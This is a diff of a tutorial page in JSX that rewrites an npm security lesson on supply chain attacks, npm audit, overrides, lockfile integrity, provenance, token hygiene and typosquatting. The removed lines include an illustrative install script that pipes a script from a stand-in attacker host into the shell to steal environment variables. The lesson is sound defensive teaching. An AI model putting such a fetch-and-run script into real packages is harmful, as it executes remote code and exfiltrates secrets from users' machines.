@@ -4,235 +4,404 @@ import InfoBox from '../../components/InfoBox';
 import InteractiveChallenge from '../../components/InteractiveChallenge';
 import LessonLayout from '../../components/LessonLayout';
 
-export default function NpmSecurity() {
+export default function Security() {
   return (
     <LessonLayout
-      title="npm Security"
+      title="Security & Auditing"
       sectionId="npm-deep-dive"
       lessonIndex={5}
-      prev={{ path: '/npm-deep-dive/scripts', label: 'npm Scripts' }}
+      prev={{ path: '/npm-deep-dive/scripts', label: 'Scripts & Lifecycle Hooks' }}
       next={null}
     >
-      <h2>npm Security Overview</h2>
+      <h2>Supply Chain Attacks</h2>
       <p>
-        The npm ecosystem's open nature makes it a target for supply chain attacks. Understanding the
-        attack vectors and defenses helps you make safer dependency decisions.
+        The npm ecosystem's greatest strength — anyone can publish — is also its greatest
+        vulnerability. Supply chain attacks target the packages you depend on, injecting
+        malicious code that runs automatically when installed or imported.
       </p>
 
-      <FlowChart
-        title="Supply Chain Attack Vectors"
-        chart={"graph TD\n  A[Attack Vectors] --> B[Typosquatting]\n  A --> C[Dependency Confusion]\n  A --> D[Maintainer Account Takeover]\n  A --> E[Malicious postinstall]\n  A --> F[Protestware]\n  B --> G[Mitigations]\n  C --> G\n  D --> G\n  E --> G\n  F --> G\n  G --> H[Audit regularly]\n  G --> I[Lock files]\n  G --> J[Scope packages]\n  G --> K[Review deps before install]"}
-      />
+      <CodeBlock language="bash" title="Real-world supply chain attacks">
+{`# event-stream (2018)
+# - Popular package (2M weekly downloads) transferred to new maintainer
+# - New maintainer added malicious dependency targeting Bitcoin wallets
+# - Went undetected for 2 months
+
+# ua-parser-js (2021)
+# - Maintainer's npm account compromised
+# - Crypto miners injected into versions 0.7.29, 0.8.0, 1.0.0
+# - 7M weekly downloads affected
+
+# colors.js & faker.js (2022)
+# - Author intentionally sabotaged own packages
+# - Added infinite loop printing "LIBERTY LIBERTY LIBERTY"
+# - Broke thousands of projects depending on them
+
+# node-ipc (2022)
+# - Author added code that wiped files on Russian/Belarusian IPs
+# - "Protestware" — political motivation
+
+# Common attack vectors:
+# 1. Typosquatting (publish 'lodassh' hoping for typos)
+# 2. Account takeover (compromise maintainer credentials)
+# 3. Dependency confusion (internal package names on public registry)
+# 4. Malicious postinstall scripts (run code on npm install)`}
+      </CodeBlock>
+
+      <InfoBox variant="danger" title="Install = Execute">
+        Running <code>npm install</code> can execute arbitrary code via postinstall scripts.
+        A malicious package can steal env vars, SSH keys, or crypto wallets the moment you
+        install it — before you ever import it in your code. This is why you should review
+        new dependencies before adding them.
+      </InfoBox>
 
       <h2>npm audit</h2>
+      <p>
+        <code>npm audit</code> checks your dependency tree against the GitHub Advisory Database
+        for known vulnerabilities. It's your first line of defense.
+      </p>
 
-      <CodeBlock language="bash" title="Running security audits">
-{`# Check for known vulnerabilities
+      <CodeBlock language="bash" title="Running and reading npm audit">
+{`# Run an audit
 npm audit
 
-# Output example:
-# ✗ Critical 1
-#   Prototype Pollution in minimist
-#   Package: minimist < 0.2.4
-#   Severity: critical
-#   Fix: npm audit fix
+# Example output:
+# ┌───────────────┬──────────────────────────────────────────────────────────┐
+# │ Moderate      │ Prototype Pollution in lodash                           │
+# ├───────────────┼──────────────────────────────────────────────────────────┤
+# │ Package       │ lodash                                                   │
+# │ Vulnerability │ https://github.com/advisories/GHSA-jf85-cpcp-j695       │
+# │ Patched in    │ >=4.17.21                                               │
+# │ Dependency of │ my-old-lib                                              │
+# │ Path          │ my-old-lib > lodash                                      │
+# │ Severity      │ moderate                                                 │
+# └───────────────┴──────────────────────────────────────────────────────────┘
 
-# Fix compatible vulnerabilities (within semver range)
-npm audit fix
+# Severity levels:
+# - critical: remotely exploitable, no user interaction needed
+# - high: significant impact, some conditions required
+# - moderate: limited impact or complex exploitation
+# - low: minimal impact
 
-# Force upgrade major versions (may break things — review first!)
-npm audit fix --force
-
-# Fail CI on any vulnerability above a threshold
-npm audit --audit-level=moderate   # exit code 1 on moderate+
-npm audit --audit-level=high       # exit code 1 on high+
-npm audit --audit-level=critical   # exit code 1 on critical only
-
-# Get JSON output for programmatic processing
+# JSON output for CI pipelines
 npm audit --json
 
-# For pnpm:
-pnpm audit --audit-level moderate`}
+# Only report specific severity levels
+npm audit --audit-level=high
+
+# Audit only production dependencies
+npm audit --omit=dev`}
       </CodeBlock>
 
-      <h2>Common Attack Types</h2>
+      <h2>Fixing Vulnerabilities</h2>
 
-      <CodeBlock language="bash" title="Typosquatting">
-{`# Typosquatting: malicious packages with names similar to popular ones
-# Real examples:
-# crossenv     (vs cross-env)
-# nodmailer    (vs nodemailer)
-# momnet       (vs moment)
+      <CodeBlock language="bash" title="npm audit fix strategies">
+{`# Auto-fix: update vulnerable packages to patched versions
+npm audit fix
+# This only updates within semver ranges (safe)
 
-# Defense:
-# - Double-check package names before installing
-# - Use organizations/@scope for internal packages
-# - Audit installed packages with depcheck`}
-      </CodeBlock>
+# Force fix: allow major version updates (DANGEROUS)
+npm audit fix --force
+# This may install breaking changes!
+# Always review and test after --force
 
-      <CodeBlock language="bash" title="Dependency confusion attack">
-{`# Dependency confusion: attacker uploads a public package
-# with the same name as your private scoped package but higher version
+# Dry run: see what would change without changing anything
+npm audit fix --dry-run
 
-# Example attack:
-# Your company uses: @mycompany/utils@1.0.0 (private registry)
-# Attacker publishes: @mycompany/utils@2.0.0 (public npm registry)
-# If npm checks public registry first, it installs the malicious version
+# When you CAN'T fix:
+# 1. Vulnerability is in a transitive dep with no fix available
+# 2. The fix requires a major version bump you can't take
+# 3. The vulnerability doesn't affect your usage
 
-# Defense:
-# 1. Use organization scopes: @mycompany/package
-#    and configure npm to ALWAYS use private registry for that scope
-# .npmrc:
-# @mycompany:registry=https://my-private-registry.com
-
-# 2. Use private registry with transparent proxy mode
-#    (blocks public packages that match private names)
-
-# 3. Lock package versions in overrides`}
-      </CodeBlock>
-
-      <CodeBlock language="bash" title="Malicious postinstall scripts">
-{`# Packages can run code during npm install via lifecycle scripts:
+# Override a transitive dependency version:
+# package.json:
 {
-  "scripts": {
-    "install": "curl https://evil.com/steal-env.sh | sh"
+  "overrides": {
+    "lodash": "^4.17.21"
+  }
+}
+# Forces ALL lodash installations to use this version
+# Use sparingly — can break packages expecting a different version`}
+      </CodeBlock>
+
+      <InfoBox variant="warning" title="audit fix --force Is a Footgun">
+        <code>npm audit fix --force</code> will perform major version bumps to fix
+        vulnerabilities. This can completely break your application. Never run it blindly —
+        always do a dry run first, then test thoroughly. For transitive deps you can't
+        control, use overrides or find an alternative package.
+      </InfoBox>
+
+      <h2>Integrity Checking</h2>
+      <p>
+        npm verifies every package it installs against the SHA-512 hash stored in your lockfile.
+        This ensures that even if the registry is compromised, tampered packages will be detected.
+      </p>
+
+      <CodeBlock language="bash" title="How npm verifies integrity">
+{`# Every lockfile entry has an integrity hash:
+# "integrity": "sha512-abc123..."
+
+# npm's verification process:
+# 1. Download tarball (or read from cache)
+# 2. Compute SHA-512 of the tarball bytes
+# 3. Compare computed hash with lockfile's integrity value
+# 4. If match → install proceeds
+# 5. If mismatch → EINTEGRITY error, refuse to install
+
+# Verify your cache is intact:
+npm cache verify
+# Output:
+# Cache verified and compressed (~/.npm/_cacache)
+# Content verified: 5421 (234567891 bytes)
+# Index entries: 8234
+
+# If you get EINTEGRITY errors:
+npm cache clean --force
+rm -rf node_modules package-lock.json
+npm install`}
+      </CodeBlock>
+
+      <h2>Package Provenance</h2>
+      <p>
+        Since 2023, npm supports provenance attestations — cryptographic proof that a package
+        was built from a specific source commit in a specific CI environment. This lets you
+        verify the entire chain from source code to published package.
+      </p>
+
+      <CodeBlock language="bash" title="Provenance in practice">
+{`# Check if a package has provenance
+npm audit signatures
+
+# When publishing with provenance (in GitHub Actions):
+npm publish --provenance
+# This creates a signed attestation linking the package to:
+# - The exact git commit
+# - The GitHub Actions workflow that built it
+# - The build environment
+
+# On npmjs.com, packages with provenance show a green checkmark
+# and link to the source commit
+
+# Verify provenance locally:
+npm audit signatures
+# Output:
+# audited 847 packages in 3s
+# 847 packages have verified registry signatures
+# 212 packages have verified attestations`}
+      </CodeBlock>
+
+      <h2>.npmrc Security</h2>
+
+      <CodeBlock language="bash" title="Securing your .npmrc">
+{`# NEVER commit auth tokens to git
+# User ~/.npmrc (contains tokens):
+//registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXXX
+
+# Project .npmrc (committed to git — NO tokens here):
+registry=https://registry.npmjs.org/
+@mycompany:registry=https://npm.mycompany.com/
+
+# .gitignore should include:
+.npmrc  # Only if project .npmrc has tokens (rare)
+
+# For CI, set tokens via environment variables:
+# In CI config:
+# NPM_TOKEN=npm_XXXXXXXXX
+
+# In project .npmrc:
+//registry.npmjs.org/:_authToken=\${NPM_TOKEN}
+# npm expands environment variables in .npmrc
+
+# Rotate tokens regularly:
+npm token list    # see all active tokens
+npm token revoke <id>  # revoke a compromised token
+npm token create  # create new token`}
+      </CodeBlock>
+
+      <h2>Typosquatting</h2>
+      <p>
+        Attackers publish packages with names similar to popular ones, hoping developers
+        make typos when installing. The malicious package runs code on install.
+      </p>
+
+      <CodeBlock language="bash" title="Typosquatting examples">
+{`# Real typosquatting attacks that were caught:
+# crossenv     (instead of cross-env) — stole env vars
+# electorn     (instead of electron)
+# event-steam  (instead of event-stream)
+# lodahs       (instead of lodash)
+
+# Protection strategies:
+# 1. Copy package names from docs/npmjs.com, never type from memory
+# 2. Verify the package before installing:
+npm info <package-name>    # check author, repo, downloads
+npm info <package-name> repository  # verify it links to expected repo
+
+# 3. Use exact package names in documentation
+# 4. Enable npm's typosquatting detection:
+#    npm now warns about similar package names
+
+# 5. For your org: register common misspellings as empty packages
+npm publish  # publish placeholder packages with common typos of your real package`}
+      </CodeBlock>
+
+      <h2>Dependency Review Tools</h2>
+
+      <CodeBlock language="bash" title="Security tools for npm">
+{`# Built-in: npm audit
+npm audit
+npm audit --json | jq '.vulnerabilities | keys'
+
+# Socket.dev — detects supply chain risks beyond CVEs
+# Checks for: network access, filesystem access, obfuscated code,
+# install scripts, and more
+# Available as GitHub App and CLI
+
+# Snyk — vulnerability scanning with fix PRs
+npx snyk test     # scan for vulnerabilities
+npx snyk monitor  # continuous monitoring
+
+# npm audit signatures — verify package provenance
+npm audit signatures
+
+# depcheck — find unused dependencies (reduce attack surface)
+npx depcheck
+
+# lockfile-lint — validate lockfile integrity
+npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm
+
+# GitHub Dependabot — automated dependency update PRs
+# .github/dependabot.yml:
+# version: 2
+# updates:
+#   - package-ecosystem: "npm"
+#     directory: "/"
+#     schedule:
+#       interval: "weekly"`}
+      </CodeBlock>
+
+      <h2>Best Practices Checklist</h2>
+
+      <FlowChart
+        title="Security Checklist for Adding a New Dependency"
+        chart={"graph TD\n  A[Want to add a package] --> B[Check npmjs.com page]\n  B --> C{Weekly downloads > 1000?}\n  C -->|No| D[High risk - find alternative]\n  C -->|Yes| E[Check last publish date]\n  E --> F{Published in last year?}\n  F -->|No| G[May be abandoned - check issues]\n  F -->|Yes| H[Check GitHub repo]\n  H --> I{Has tests and CI?}\n  I -->|No| J[Medium risk - evaluate carefully]\n  I -->|Yes| K[Check dependencies count]\n  K --> L{Pulls in > 50 transitive deps?}\n  L -->|Yes| M[Consider lighter alternative]\n  L -->|No| N[Run npm audit after install]\n  N --> O[Review postinstall scripts]\n  O --> P[Add to project]"}
+      />
+
+      <CodeBlock language="bash" title="Security best practices">
+{`# 1. Pin versions for production apps
+npm config set save-exact true
+# Saves "lodash": "4.17.21" instead of "^4.17.21"
+
+# 2. Always use lockfiles
+# npm ci in CI, never npm install
+
+# 3. Enable 2FA on your npm account
+npm profile enable-2fa auth-and-writes
+
+# 4. Audit regularly
+npm audit
+# Add to CI: npm audit --audit-level=moderate
+
+# 5. Review new dependencies
+npm info <pkg> repository  # check the source
+npm info <pkg> maintainers # who maintains it?
+
+# 6. Check for outdated packages
+npm outdated
+# Update strategy: one major version at a time, test between each
+
+# 7. Use overrides for stuck transitive deps
+# package.json:
+{
+  "overrides": {
+    "vulnerable-pkg": "^2.0.1"
   }
 }
 
-# Real examples: event-stream attack (2018), ua-parser-js, node-ipc
-
-# Defense:
-# 1. Review package code before installing unknown packages
-# 2. Use --ignore-scripts flag for CI
+# 8. Disable postinstall scripts for untrusted packages
 npm install --ignore-scripts
-
-# 3. Use Socket.dev or Snyk to scan packages
-# 4. Avoid packages with unusual postinstall scripts
-
-# Audit new packages before adding:
-npx socket npx-cli install some-package  # Socket scans it first`}
+# Then selectively run scripts you trust`}
       </CodeBlock>
 
-      <h2>Keeping Dependencies Updated</h2>
+      <h2>npm outdated & Update Strategies</h2>
 
-      <CodeBlock language="bash" title="Managing updates safely">
-{`# Check outdated packages
+      <CodeBlock language="bash" title="Managing updates">
+{`# See what's outdated
 npm outdated
+# Package    Current  Wanted  Latest  Location
+# lodash     4.17.19  4.17.21 4.17.21 my-app
+# react      17.0.2   17.0.2  18.2.0  my-app
+# typescript 4.9.5    4.9.5   5.3.3   my-app
 
-# Output:
-# Package         Current  Wanted  Latest
-# react            18.2.0  18.2.0  18.3.1
-# vite              5.0.0   5.4.2   6.0.0
+# Current: what you have installed
+# Wanted: latest matching your semver range
+# Latest: absolute latest on registry
 
-# "Wanted" = latest within semver range (safe to update)
-# "Latest" = latest published (may be major upgrade)
-
-# Update to "wanted" versions
+# Update within ranges (safe):
 npm update
 
-# Interactively choose updates
-npx npm-check-updates --interactive
-# OR
-npx ncu -u    # writes updated versions to package.json
-npm install   # then regenerate lock file
+# Update a specific package:
+npm update lodash
 
-# Automate dependency updates: Dependabot (GitHub) or Renovate
-# .github/dependabot.yml:
-version: 2
-updates:
-  - package-ecosystem: npm
-    directory: /
-    schedule:
-      interval: weekly
-    open-pull-requests-limit: 10`}
+# Update to latest (may be breaking):
+npm install lodash@latest
+npm install react@latest react-dom@latest
+
+# Interactive update tool:
+npx npm-check-updates  # (ncu) — shows all possible updates
+npx npm-check-updates -u  # updates package.json ranges
+npm install  # install the new versions
+
+# Update strategy for production:
+# 1. Run npm outdated weekly
+# 2. Update patch/minor versions (npm update) — low risk
+# 3. Update major versions one at a time
+# 4. Read changelogs for breaking changes
+# 5. Run full test suite after each update
+# 6. Deploy behind feature flags if unsure`}
       </CodeBlock>
 
-      <h2>Package Provenance and Signing</h2>
-
-      <CodeBlock language="bash" title="npm provenance">
-{`# npm 9.5+ supports package provenance
-# Cryptographically links a published package to its source code + CI build
-
-# When publishing with provenance (from GitHub Actions):
-npm publish --provenance
-
-# Verify provenance of a package:
-npm audit signatures
-
-# Output:
-# audited 150 packages in 2.3s
-# 150 packages have verified registry signatures
-# 10 packages have verified attestations
-# 0 packages have invalid signatures
-
-# Check a specific package's provenance:
-npm info some-package --json | jq '.dist.attestations'`}
-      </CodeBlock>
-
-      <h2>Security Best Practices</h2>
-
-      <CodeBlock language="bash" title="Security checklist">
-{`# 1. Run npm audit in CI
-# .github/workflows/ci.yml:
-- run: npm audit --audit-level=moderate
-
-# 2. Use exact versions for critical dependencies
-npm install react --save-exact
-# Results in: "react": "18.2.0" (no caret/tilde)
-
-# 3. Set up Dependabot or Renovate for automated PRs
-
-# 4. Use private registry with authentication for internal packages
-
-# 5. Verify new packages before installing:
-npx socket scan              # Socket.dev deep analysis
-npx snyk test                # Snyk vulnerability scan
-npx is-website-vulnerable https://mysite.com  # Retirejs style check
-
-# 6. Two-factor authentication on npm account
-npm profile enable-2fa auth-and-writes
-
-# 7. Use organizations for scoped packages
-npm org create my-company
-npm access grant read-write my-company:developers my-company/my-package
-
-# 8. Minimize permission scope for automation tokens
-npm token create --read-only              # for CI that only downloads
-npm token create --cidr=10.0.0.0/8        # restrict to IP range`}
-      </CodeBlock>
-
-      <InfoBox variant="danger" title="Never Store Secrets in package.json">
-        <p>
-          The <code>package.json</code> file is committed to source control and included in published packages.
-          Never put API keys, passwords, or tokens in <code>package.json</code> or <code>.npmrc</code> that is
-          committed. Use environment variables and <code>.env</code> files (gitignored) instead.
-          Check <code>.npmrc</code> is in your <code>.gitignore</code> if it contains auth tokens.
-        </p>
+      <InfoBox variant="tip" title="Automate with Dependabot or Renovate">
+        GitHub Dependabot and Mend Renovate automatically open PRs for dependency updates.
+        Configure them to group patch updates (merge quickly) but separate major updates
+        (review carefully). This keeps you current without manual labor.
       </InfoBox>
 
       <InteractiveChallenge
-        question="What is a dependency confusion attack in npm?"
+        question="A package you depend on has a critical vulnerability in a transitive dependency (3 levels deep). npm audit fix doesn't resolve it. What's the safest next step?"
         options={[
-          "Installing incompatible versions of the same package in different workspaces",
-          "Uploading a malicious public package with the same name as a private internal package at a higher version",
-          "Creating a circular dependency that causes infinite resolution loops",
-          "Publishing a package that shadows a Node.js built-in module"
+          "Run npm audit fix --force to force the update",
+          "Add an override in package.json to pin the fixed version of the transitive dep",
+          "Ignore it since it's not a direct dependency",
+          "Delete node_modules and reinstall"
         ]}
         correctIndex={1}
-        explanation="In a dependency confusion attack, an attacker publishes a package to the public npm registry with the same name as an organization's private package but at a higher version number. If npm's resolution checks the public registry alongside the private one without proper scoping, it may install the higher-versioned public (malicious) package instead. Defense: always use scoped package names (@myorg/package) and configure .npmrc to route that scope exclusively to your private registry."
+        explanation="The 'overrides' field in package.json lets you force a specific version of any transitive dependency without major version bumps to your direct dependencies. This is safer than --force (which may introduce breaking changes) and more responsible than ignoring it. Test thoroughly after adding overrides."
       />
 
       <InteractiveChallenge
-        question="What does 'npm audit fix --force' do and why should you be careful with it?"
+        question="What makes typosquatting attacks particularly dangerous in the npm ecosystem?"
         options={[
-          "It runs the fix with elevated system permissions",
-          "It upgrades packages to the latest major version even if that introduces breaking changes",
-          "It ignores vulnerability advisories marked as false positives",
-          "It reinstalls all packages from scratch to ensure clean state"
+          "npm doesn't check package names for typos",
+          "Malicious postinstall scripts execute immediately on npm install, before you ever import the package",
+          "Typosquatted packages look identical on npmjs.com",
+          "npm automatically installs suggested packages"
         ]}
         correctIndex={1}
-        explanation="npm audit fix --force upgrades packages to the minimum version that resolves the vulnerability, even if that means crossing a major version boundary (e.g., package@1.x to package@2.x). Major version bumps can introduce breaking API changes. Always review what --force would change with 'npm audit fix --dry-run' first and test thoroughly after applying the forced fix."
+        explanation="The most dangerous aspect is that npm packages can define postinstall scripts that run immediately when the package is installed. A typosquatted package can steal your environment variables, SSH keys, or credentials the instant you accidentally install it — you don't even need to use it in your code."
       />
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li>Supply chain attacks are real and common — the npm ecosystem is a high-value target</li>
+        <li><code>npm audit</code> checks for known vulnerabilities; run it in CI</li>
+        <li><code>npm audit fix</code> is safe; <code>--force</code> is dangerous — always dry-run first</li>
+        <li>Integrity hashes in lockfiles detect tampered packages</li>
+        <li>Provenance attestations verify packages were built from known source in trusted CI</li>
+        <li>Never commit auth tokens; use environment variables in CI</li>
+        <li>Review new dependencies: check downloads, maintenance, repo quality, and dep count</li>
+        <li>Use overrides for stuck transitive vulnerabilities</li>
+        <li>Enable 2FA, pin versions, and automate updates with Dependabot/Renovate</li>
+      </ul>
     </LessonLayout>
   );
 }
